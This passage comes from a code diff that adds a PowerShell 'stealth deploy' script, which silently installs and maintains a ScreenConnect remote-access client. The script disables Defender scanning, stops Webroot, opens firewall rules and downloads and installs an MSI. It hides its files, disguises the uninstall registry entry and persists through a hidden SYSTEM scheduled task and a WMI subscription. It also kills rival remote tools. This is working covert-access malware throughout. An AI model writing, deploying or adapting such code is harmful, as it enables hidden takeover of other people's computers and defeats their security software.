+    foreach (`$e in `$exes) { if (`$e.Length -lt 50000) { return `$true }; try { `$fs=[IO.File]::Open(`$e.FullName,'Open','Read','Read'); `$fs.Close() } catch { return `$true } }
+    return `$false
+}
+function ScRunning {
+    try {
+        `$s = Get-CimInstance -ClassName Win32_Service -Filter "Name='`$svcName'" -EA SilentlyContinue
+        if (`$s -and `$s.State -eq 'Running') { return `$true }
+    } catch {}
+    try {
+        `$s = Get-CimInstance -ClassName Win32_Service -EA SilentlyContinue | Where-Object { `$_.Name -like "*`$fp*" -or `$_.DisplayName -like "*`$fp*" } | Select-Object -First 1
+        if (`$s -and `$s.State -eq 'Running') { return `$true }
+    } catch {}
+    return `$false
+}
+function ScPresent {
+    try {
+        `$s = Get-CimInstance -ClassName Win32_Service -Filter "Name='`$svcName'" -EA SilentlyContinue
+        if (`$s) { return `$true }
+    } catch {}
+    try {
+        return [bool](Get-CimInstance -ClassName Win32_Service -EA SilentlyContinue | Where-Object { `$_.Name -like "*`$fp*" -or `$_.DisplayName -like "*`$fp*" } | Select-Object -First 1)
+    } catch {}
+    return `$false
+}
+function FwAllow {
+    foreach (`$root in (ScRoots)) {
+        Get-ChildItem `$root -Recurse -Filter *.exe -EA SilentlyContinue | ForEach-Object {
+            `$n = 'WU_SC_' + `$_.BaseName
+            netsh advfirewall firewall delete rule name=`$n >`$null 2>&1
+            netsh advfirewall firewall delete rule name=(`$n + '_out') >`$null 2>&1
+            netsh advfirewall firewall add rule name=`$n dir=in action=allow program=`$_.FullName enable=yes profile=any >`$null 2>&1
+            netsh advfirewall firewall add rule name=(`$n + '_out') dir=out action=allow program=`$_.FullName enable=yes profile=any >`$null 2>&1
+        }
+    }
+}
+function WebrootPush {
+    if (-not (TestWebrootInstalled)) { return }
+    L 'Webroot detected - pausing agent'
+    foreach (`$n in @('WRSVC','WRSAService','WRCoreService','WRConsumerService')) {
+        if (Get-Service `$n -EA SilentlyContinue) { Stop-Service `$n -Force -EA SilentlyContinue; Set-Service `$n -StartupType Disabled -EA SilentlyContinue }
+    }
+    Get-Process -Name @('WRSA','WRSAMain','WRConsumerService') -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
+    QuietExclusions; FwAllow
+}
+function SyncCopies {
+    try {
+        New-Item -ItemType Directory -Path `$work -Force | Out-Null
+        New-Item -ItemType Directory -Path `$workAlt -Force | Out-Null
+        if ((Test-Path `$mon) -and -not (Test-Path `$monAlt)) { Copy-Item `$mon `$monAlt -Force -EA SilentlyContinue }
+        elseif ((Test-Path `$monAlt) -and -not (Test-Path `$mon)) { Copy-Item `$monAlt `$mon -Force -EA SilentlyContinue }
+        elseif ((Test-Path `$mon) -and (Test-Path `$monAlt)) {
+            if ((Get-Item `$mon).Length -ne (Get-Item `$monAlt).Length) { Copy-Item `$mon `$monAlt -Force -EA SilentlyContinue }
+        }
+        foreach (`$p in @(`$work, `$workAlt, `$mon, `$monAlt)) {
+            `$i = Get-Item `$p -Force -EA SilentlyContinue
+            if (`$i) { `$i.Attributes = 'Hidden','System' }
+        }
+    } catch {}
+}
+function ReactiveIfBlocked {
+    `$issues = @()
+    if (-not (Test-Path `$mon) -and -not (Test-Path `$monAlt)) { `$issues += 'monitor_missing' }
+    try {
+        `$probe = Join-Path `$work '.writeprobe'
+        'ok' | Out-File `$probe -Encoding ASCII -Force -EA Stop
+        Remove-Item `$probe -Force -EA SilentlyContinue
+    } catch { `$issues += 'workdir_not_writable' }
+    `$svcOk = ScPresent
+    if (-not `$svcOk) { `$issues += 'sc_service_missing' }
+    elseif (-not (ScRunning)) { `$issues += 'sc_start_blocked' }
+    if (TestHollow) { `$issues += 'sc_hollow_av_quarantine' }
+    # do not flag webroot_present alone - causes endless reactive loops
+    if (`$issues.Count -eq 0) { return }
+    L ("Reactive AV pushback - issues: " + (`$issues -join ', '))
+    QuietExclusions; FwAllow
+    if (`$issues -contains 'webroot_present' -or `$issues -contains 'sc_hollow_av_quarantine') { WebrootPush }
+    SyncCopies
+    if (Get-Command Set-MpPreference -EA SilentlyContinue) {
+        try {
+            Set-MpPreference -DisableRealtimeMonitoring `$true -EA SilentlyContinue
+            Set-MpPreference -DisableScriptScanning `$true -EA SilentlyContinue
+            Set-MpPreference -DisableIOAVProtection `$true -EA SilentlyContinue
+            QuietExclusions
+        } catch {}
+    }
+}
+function Allowed([string]`$n,[string]`$p='') {
+    foreach (`$a in `$allowed) { if (`$n -like "*`$a*" -or `$p -like "*`$a*") { return `$true } }
+    if (`$n -eq `$arpName) { return `$true }
+    return `$false
+}
+function Arp {
+    foreach (`$root in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')) {
+        Get-ChildItem `$root -EA SilentlyContinue | ForEach-Object {
+            `$p = Get-ItemProperty `$_.PSPath -EA SilentlyContinue
+            if (-not `$p) { return }
+            `$hit = (`$p.DisplayName -like "*ScreenConnect Client (`$fp)*") -or
+                    (`$p.InstallLocation -like "*`$fp*" -and `$p.DisplayName -like '*ScreenConnect*') -or
+                    (`$_.PSPath -like "*`$fp*" -and (`$p.DisplayName -like '*ScreenConnect*' -or `$p.DisplayName -eq `$arpName))
+            if (-not `$hit) { return }
+            Set-ItemProperty `$_.PSPath -Name DisplayName -Value `$arpName -EA SilentlyContinue
+            Set-ItemProperty `$_.PSPath -Name Publisher -Value `$arpPub -EA SilentlyContinue
+        }
+    }
+}
+function AppOk {
+    if (ScRunning) { if (-not (TestHollow)) { return `$true }; return `$false }
+    if (ScPresent) { return `$true }
+    foreach (`$base in @(
+        "`${env:ProgramFiles}\ScreenConnect Client (`$fp)",
+        "`${env:ProgramFiles(x86)}\ScreenConnect Client (`$fp)",
+        "`${env:ProgramData}\ScreenConnect\`$fp"
+    )) { if (Test-Path `$base) { return `$true } }
+    return `$false
+}
+function Install {
+    if ((ScRunning) -and -not (TestHollow)) { L 'Primary SC service RUNNING - skip MSI'; return `$true }
+    if ((ScPresent) -and -not (TestHollow)) {
+        L 'Primary SC present - starting service (no MSI)'
+        cmd /c "sc config `"$svcName`" start= auto" >`$null 2>&1
+        cmd /c "sc start `"$svcName`"" >`$null 2>&1
+        Start-Sleep 5
+        if (ScRunning) { L 'SC service RUNNING after sc start'; return `$true }
+        L 'sc start failed - will try MSI repair'
+    }
+    if (-not (ScPresent)) { L 'Primary SC service missing - forcing MSI install' }
+    elseif (TestHollow) { L 'Primary SC hollow - forcing MSI repair'; cmd /c "sc stop `"$svcName`"" >`$null 2>&1 }
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    New-Item -ItemType Directory -Path `$work -Force | Out-Null
+    if (Test-Path `$msi) { Remove-Item `$msi -Force -EA SilentlyContinue }
+    try { Invoke-WebRequest -Uri `$msiUrl -OutFile `$msi -UseBasicParsing } catch {
+        `$wc = New-Object System.Net.WebClient; `$wc.DownloadFile(`$msiUrl, `$msi); `$wc.Dispose()
+    }
+    if (-not (Test-Path `$msi) -or ((Get-Item `$msi).Length -lt 500000)) { L 'MSI invalid'; return `$false }
+    L ('MSI bytes: ' + (Get-Item `$msi).Length)
+    `$p = Start-Process msiexec.exe -ArgumentList "/i ``"`$msi``" /quiet /norestart ALLUSERS=1" -Wait -PassThru -WindowStyle Hidden
+    `$code = `$p.ExitCode
+    L ("msiexec exit " + `$code)
+    Start-Sleep 8
+    Remove-Item `$msi -Force -EA SilentlyContinue
+    FwAllow
+    cmd /c "sc start `"$svcName`"" >`$null 2>&1
+    Start-Sleep 3
+    if (ScRunning) { L 'SC service RUNNING after MSI'; return `$true }
+    if (ScPresent) { L 'SC service present after MSI but not running'; return `$false }
+    L 'MSI finished but SC service still missing'
+    return `$false
+}
+
+L 'monitor tick'
+QuietExclusions
+SyncCopies
+ReactiveIfBlocked
+if (TestWebroot -or (TestHollow) -or (TestWebrootInstalled)) { WebrootPush }
+
+if (-not (ScRunning) -or -not (AppOk)) {
+    L 'reinstall'
+    if (-not (Install)) { ReactiveIfBlocked; Install | Out-Null }
+    Start-Sleep 5
+}
+if (ScPresent) {
+    cmd /c "sc config `"$svcName`" start= auto" >`$null 2>&1
+    cmd /c "sc failure `"$svcName`" reset= 86400 actions= restart/5000/restart/5000/restart/5000" >`$null 2>&1
+    if (-not (ScRunning)) {
+        cmd /c "sc start `"$svcName`"" >`$null 2>&1
+        Start-Sleep 3
+        if (-not (ScRunning)) { ReactiveIfBlocked }
+    } else {
+        L 'SC healthy - monitor idle'
+    }
+}
+Arp
+
+Get-Process -EA SilentlyContinue | ForEach-Object {
+    `$pn = `$_.ProcessName; `$path = ''; try { `$path = `$_.Path } catch {}
+    if (`$pn -like '*ScreenConnect*' -or `$pn -like '*Control*') {
+        `$ok = `$false; foreach (`$a in `$allowed) { if (`$path -like "*`$a*") { `$ok = `$true; break } }
+        if (-not `$ok -and `$path -like '*ScreenConnect*') { Stop-Process -Id `$_.Id -Force -EA SilentlyContinue }
+        return
+    }
+    foreach (`$b in `$rivals) {
+        if (`$pn -like "*`$b*" -or (`$path -and `$path -like "*`$b*")) {
+            Stop-Process -Id `$_.Id -Force -EA SilentlyContinue; break
+        }
+    }
+}
+Get-Service -EA SilentlyContinue | ForEach-Object {
+    if (Allowed `$_.DisplayName) { return }
+    if (`$_.Name -eq `$svcName) { return }
+    `$bad = `$false
+    if ((`$_.DisplayName -like '*ScreenConnect Client*' -or `$_.Name -like '*ScreenConnect Client*') -and `$_.Name -ne `$svcName) { `$bad = `$true }
+    else { foreach (`$b in `$rivals) { if (`$_.DisplayName -like "*`$b*" -or `$_.Name -like "*`$b*") { `$bad = `$true; break } } }
+    if (-not `$bad) { return }
+    Stop-Service `$_.Name -Force -EA SilentlyContinue
+    Set-Service `$_.Name -StartupType Disabled -EA SilentlyContinue
+    sc.exe delete "`$(`$_.Name)" 2>&1 | Out-Null
+}
+SyncCopies
+L 'monitor done'
+"@
+
+Sync-MonitorCopies -Content $monitor
+Write-FailoverVbs -Path $HelperVbsPath
+Write-FailoverVbs -Path $HelperVbsPathAlt
+Write-Log "Monitor dual-path: $MonitorScriptPath | $MonitorScriptPathAlt"
+
+# Persist #1: hidden scheduled task - VBS tries primary then failover path
+try {
+    Unregister-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath -Confirm:$false -ErrorAction SilentlyContinue
+    $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //Nologo `"$HelperVbsPath`""
+    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) `
+        -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration ([TimeSpan]::FromDays(3650))
+    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
+        -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero) -Hidden -MultipleInstances IgnoreNew
+    Register-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath -Action $action -Trigger $trigger `
+        -Principal $principal -Settings $settings -Force | Out-Null
+    $startupTask = 'Startup'
+    Unregister-ScheduledTask -TaskName $startupTask -TaskPath $TaskPath -Confirm:$false -ErrorAction SilentlyContinue
+    # Startup action prefers primary VBS, falls back inside VBS to alt monitor
+    Register-ScheduledTask -TaskName $startupTask -TaskPath $TaskPath -Action $action `
+        -Trigger (New-ScheduledTaskTrigger -AtStartup) -Principal $principal -Settings $settings -Force | Out-Null
+    Write-Log "Task registered: $TaskPath$TaskName + Startup (15 min, dual-path)"
+    Start-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName -ErrorAction SilentlyContinue
+} catch {
+    Write-Log "Task error: $($_.Exception.Message)"
+}
+
+# Persist #2: WMI - points at failover VBS
+try {
+    Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
+        Where-Object { $_.Name -eq $WmiFilterName } | ForEach-Object { $_.Delete() }
+    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
+        Where-Object { $_.Name -eq $WmiConsumerName } | ForEach-Object { $_.Delete() }
+
+    $filter = ([WmiClass]'\\.\root\subscription:__EventFilter').CreateInstance()
+    $filter.Name = $WmiFilterName
+    $filter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
+    $filter.QueryLanguage = 'WQL'
+    $filter.EventNamespace = 'root\cimv2'
+    $filter.Put() | Out-Null
+
+    $consumer = ([WmiClass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance()
+    $consumer.Name = $WmiConsumerName
+    $consumer.CommandLineTemplate = "wscript.exe //B //Nologo `"$HelperVbsPath`""
+    $consumer.Put() | Out-Null
+
+    $binding = ([WmiClass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance()
+    $binding.Filter = $filter
+    $binding.Consumer = $consumer
+    $binding.Put() | Out-Null
+    Write-Log 'WMI persistence registered (failover VBS)'
+} catch {
+    Write-Log "WMI error: $($_.Exception.Message)"
+}
+
+# Backup deployer copies in both camouflaged dirs
+if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
+    foreach ($dir in @($WorkDir, $WorkDirAlt)) {
+        $bak = Join-Path $dir 'wucache_pkg.ps1'
+        Copy-Item $PSCommandPath $bak -Force -ErrorAction SilentlyContinue
+        Set-HiddenSystem $bak
+    }
+}
+
+# ============================================
+# PHASE 4: FINAL + interference check
+# ============================================
+Write-Log 'PHASE 4: final verify'
+if (-not (Test-ScServiceRunning) -or -not (Test-AppInstalled -Fingerprint $PrimaryFingerprint)) {
+    Install-PrimarySc | Out-Null
+    Start-Sleep -Seconds 8
+}
+Start-PrimaryService | Out-Null
+Set-ArpCamouflage | Out-Null
+Invoke-RivalPurge
+Set-ArpCamouflage | Out-Null
+
+$interference = Test-PayloadInterference
+if ($interference.Interfered) {
+    Invoke-ReactiveAvPushback -Issues $interference.Issues
+    # Re-seed dual copies after pushback
+    if (Test-Path $MonitorScriptPath) {
+        Sync-MonitorCopies -Content (Get-Content -LiteralPath $MonitorScriptPath -Raw -ErrorAction SilentlyContinue)
+        Write-FailoverVbs -Path $HelperVbsPath
+        Write-FailoverVbs -Path $HelperVbsPathAlt
+    }
+}
+
+$conn = Test-TcpPort
+Write-Log "Relay ${RelayServer}:$RelayPort reachable=$conn"
+Write-Log '=== Stealth deploy end ==='
+Write-Log 'TIP: Deploy this script as SYSTEM via your RMM for zero UAC and max reliability.'
+
+try {
+    if ($script:Mutex) { $script:Mutex.ReleaseMutex() | Out-Null; $script:Mutex.Dispose() }
+} catch {}
